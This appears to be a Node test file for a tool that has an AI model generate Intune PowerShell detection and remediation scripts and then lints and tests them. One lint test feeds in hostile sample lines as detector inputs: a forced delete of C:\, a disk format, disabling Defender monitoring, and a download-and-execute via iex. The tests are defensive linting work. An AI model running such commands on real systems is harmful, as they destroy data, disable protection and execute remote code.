'use strict';
// Run with: node --test remediation-builder/test
const test = require('node:test');
const assert = require('node:assert');
const RB = require('../builder.js');

const GOOD_DETECTION = [
  '$svc = Get-Service -Name wuauserv -ErrorAction SilentlyContinue',
  'if ($svc -and $svc.StartType -eq "Disabled") { Write-Output "wuauserv disabled"; exit 1 }',
  'Write-Output "wuauserv ok"',
  'exit 0'
].join('\n');

const GOOD_REMEDIATION = [
  'try {',
  '  Set-Service -Name wuauserv -StartupType Manual -ErrorAction Stop',
  '  Start-Service -Name wuauserv -ErrorAction Stop',
  '  Write-Output "wuauserv fixed"',
  '  exit 0',
  '} catch {',
  '  Write-Output "failed: $($_.Exception.Message)"',
  '  exit 1',
  '}'
].join('\n');

function bundleJson(over) {
  return JSON.stringify(Object.assign({
    title: 'Windows Update service', summary: 's', runAs: 'system', run64Bit: true,
    detection: GOOD_DETECTION, remediation: GOOD_REMEDIATION, assumptions: [],
    scenarios: [{ name: 'compliant', deviceState: 'x', expectedDetectionExit: 0, expectedDetectionOutput: 'ok', expectedRemediation: 'none' }]
  }, over || {}));
}
const PASS_REPORT = JSON.stringify({ verdict: 'pass', summary: 'ok', results: [{ scenario: 'compliant', detectionExit: 0, detectionOutput: 'ok', remediationExit: null, remediationOutput: null, postRemediationDetectionExit: null, passed: true, notes: '' }], issues: [] });
const FAIL_REPORT = JSON.stringify({ verdict: 'fail', summary: 'bad', results: [{ scenario: 'broken', detectionExit: 0, detectionOutput: '', remediationExit: 1, remediationOutput: '', postRemediationDetectionExit: 1, passed: false, notes: '' }], issues: [{ severity: 'error', script: 'remediation', line: 2, problem: 'p', fix: 'f' }] });

// Mock fetch that replays canned model replies and records requests.
function mockFetch(replies, calls) {
  let i = 0;
  return async (url, init) => {
    calls.push({ url, init, body: JSON.parse(init.body) });
    const text = replies[Math.min(i++, replies.length - 1)];
    const payload = { content: [{ type: 'text', text }], stop_reason: 'end_turn' };
    return { ok: true, status: 200, text: async () => JSON.stringify(payload) };
  };
}

test('extractJson handles fences, prose and nested braces in strings', () => {
  assert.deepStrictEqual(RB.extractJson('```json\n{"a":1}\n```'), { a: 1 });
  assert.deepStrictEqual(RB.extractJson('Here you go: {"a":"}{","b":{"c":2}} thanks'), { a: '}{', b: { c: 2 } });
  assert.throws(() => RB.extractJson('no json here'));
  assert.throws(() => RB.extractJson('{"a":'));
});

test('normaliseBundle validates and normalises line endings', () => {
  const b = RB.normaliseBundle(JSON.parse(bundleJson()));
  assert.ok(b.detection.includes('\r\n'));
  assert.strictEqual(b.runAs, 'system');
  assert.throws(() => RB.normaliseBundle({ detection: 'x' }), /remediation/);
  assert.throws(() => RB.normaliseBundle({ remediation: 'x' }), /detection/);
});

test('normaliseTestReport refuses a pass that contradicts the detail', () => {
  const r = RB.normaliseTestReport({ verdict: 'pass', results: [{ passed: false }], issues: [] });
  assert.strictEqual(r.verdict, 'fail');
  const r2 = RB.normaliseTestReport({ verdict: 'pass', results: [{ passed: true }], issues: [{ severity: 'error' }] });
  assert.strictEqual(r2.verdict, 'fail');
  const r3 = RB.normaliseTestReport({ verdict: 'pass', results: [{ passed: true }], issues: [{ severity: 'warning' }] });
  assert.strictEqual(r3.verdict, 'pass');
});

test('lint accepts a well-formed pair', () => {
  const f = RB.lintBundle({ detection: GOOD_DETECTION, remediation: GOOD_REMEDIATION });
  assert.strictEqual(f.filter((x) => x.severity === 'error').length, 0, JSON.stringify(f));
});

test('lint flags interactive input, missing exit and detection that never exits 1', () => {
  const f = RB.lintScript('detection', 'Read-Host "go?"\nWrite-Output "x"');
  const rules = f.map((x) => x.rule);
  assert.ok(rules.includes('interactive'));
  assert.ok(rules.includes('no-exit'));
  const g = RB.lintScript('detection', 'Write-Output "x"\nexit 0').map((x) => x.rule);
  assert.ok(g.includes('detection-no-issue-path'));
  const h = RB.lintScript('detection', 'Write-Output "x"\nexit 1').map((x) => x.rule);
  assert.ok(h.includes('detection-no-compliant-path'));
});

test('lint flags a detection script that changes state', () => {
  const f = RB.lintScript('detection', 'Set-Service wuauserv -StartupType Manual\nWrite-Output a\nif ($x) { exit 1 }\nexit 0');
  assert.ok(f.some((x) => x.rule === 'detection-writes'));
});

test('lint flags dangerous patterns', () => {
  const rules = (code) => RB.lintScript('remediation', 'try {}\nWrite-Output a\n' + code + '\nexit 0').map((x) => x.rule);
  assert.ok(rules('Remove-Item -Recurse -Force C:\\').includes('destructive-delete'));
  assert.ok(rules('Format-Volume -DriveLetter D').includes('destructive-disk'));
  assert.ok(rules('Set-MpPreference -DisableRealtimeMonitoring $true').includes('disable-security'));
  assert.ok(rules('$password = "hunter2hunter2"').includes('hardcoded-secret'));
  assert.ok(rules('Restart-Computer -Force').includes('reboot'));
  assert.ok(rules('iex (New-Object Net.WebClient).DownloadString("http://x")').includes('invoke-expression'));
  assert.ok(rules('Write-Host "hi"').includes('write-host'));
});

test('lint ignores commented-out code and block comments', () => {
  const code = '<#\nRead-Host\n#>\n# Read-Host\ntry {}\nWrite-Output a\nexit 0';
  assert.ok(!RB.lintScript('remediation', code).some((x) => x.rule === 'interactive'));
});

test('lint reports correct line numbers', () => {
  const f = RB.lintScript('remediation', 'try {}\nWrite-Output a\nRead-Host\nexit 0');
  assert.strictEqual(f.find((x) => x.rule === 'interactive').line, 3);
});

test('callClaude sends the expected request and surfaces API errors', async () => {
  const calls = [];
  const out = await RB.callClaude({ apiKey: 'k', model: 'claude-sonnet-5-5', system: 's', user: 'u', fetchImpl: mockFetch(['hello'], calls) });
  assert.strictEqual(out, 'hello');
  assert.strictEqual(calls[0].url, 'https://api.anthropic.com/v1/messages');
  assert.strictEqual(calls[0].init.headers['x-api-key'], 'k');
  assert.strictEqual(calls[0].init.headers['anthropic-dangerous-direct-browser-access'], 'true');
  assert.strictEqual(calls[0].body.model, 'claude-sonnet-5-5');

  const bad = async () => ({ ok: false, status: 401, text: async () => JSON.stringify({ error: { message: 'invalid x-api-key' } }) });
  await assert.rejects(RB.callClaude({ apiKey: 'k', model: 'm', system: 's', user: 'u', fetchImpl: bad }), /401.*invalid x-api-key/);
  await assert.rejects(RB.callClaude({ model: 'm', system: 's', user: 'u', fetchImpl: bad }), /API key/);

  const cut = async () => ({ ok: true, status: 200, text: async () => JSON.stringify({ content: [{ type: 'text', text: '{' }], stop_reason: 'max_tokens' }) });
  await assert.rejects(RB.callClaude({ apiKey: 'k', model: 'm', system: 's', user: 'u', fetchImpl: cut }), /output limit/);
});

test('pipeline: passes on first round with 2 model calls', async () => {
  const calls = [];
  const res = await RB.runPipeline({ input: 'fix wuauserv', apiKey: 'k', model: 'm', fetchImpl: mockFetch([bundleJson(), PASS_REPORT], calls) });
  assert.strictEqual(res.passed, true);
  assert.strictEqual(res.rounds, 0);
  assert.strictEqual(calls.length, 2);
  assert.ok(calls[0].body.system.includes('Intune Remediations'));
  assert.ok(calls[1].body.messages[0].content.includes('1: $svc = Get-Service')); // test prompt numbers lines
});

test('pipeline: fails, fixes, then passes on re-test', async () => {
  const calls = [];
  const events = [];
  const fixed = bundleJson({ title: 'Fixed' });
  const res = await RB.runPipeline({
    input: 'fix wuauserv', apiKey: 'k', model: 'm', maxFixRounds: 2,
    onProgress: (p) => events.push(p.step),
    fetchImpl: mockFetch([bundleJson(), FAIL_REPORT, fixed, PASS_REPORT], calls)
  });
  assert.strictEqual(res.passed, true);
  assert.strictEqual(res.rounds, 1);
  assert.strictEqual(res.bundle.title, 'Fixed');
  assert.strictEqual(calls.length, 4);
  assert.ok(calls[2].body.messages[0].content.includes('VIRTUAL TEST REPORT'));
  assert.deepStrictEqual(events.filter((e) => e === 'fix').length, 1);
});

test('pipeline: stops at maxFixRounds and reports not passed', async () => {
  const calls = [];
  const res = await RB.runPipeline({
    input: 'x', apiKey: 'k', model: 'm', maxFixRounds: 1,
    fetchImpl: mockFetch([bundleJson(), FAIL_REPORT, bundleJson(), FAIL_REPORT], calls)
  });
  assert.strictEqual(res.passed, false);
  assert.strictEqual(res.rounds, 1);
  assert.strictEqual(calls.length, 4);
});

test('pipeline: a passing AI verdict still fails when lint finds errors', async () => {
  const dangerous = bundleJson({ remediation: 'try {}\nWrite-Output a\nRead-Host\nexit 0' });
  const res = await RB.runPipeline({ input: 'x', apiKey: 'k', model: 'm', maxFixRounds: 0, fetchImpl: mockFetch([dangerous, PASS_REPORT], []) });
  assert.strictEqual(res.passed, false);
  assert.ok(RB.hasErrors(res.lint));
});

test('pipeline: rejects empty input and garbage model output', async () => {
  await assert.rejects(RB.runPipeline({ input: '  ', apiKey: 'k', model: 'm', fetchImpl: mockFetch(['x'], []) }), /Describe/);
  await assert.rejects(RB.runPipeline({ input: 'x', apiKey: 'k', model: 'm', fetchImpl: mockFetch(['not json'], []) }), /No JSON/);
});

test('safeFileName', () => {
  assert.strictEqual(RB.safeFileName('Clear Teams cache!'), 'clear-teams-cache');
  assert.strictEqual(RB.safeFileName(''), 'remediation');
});
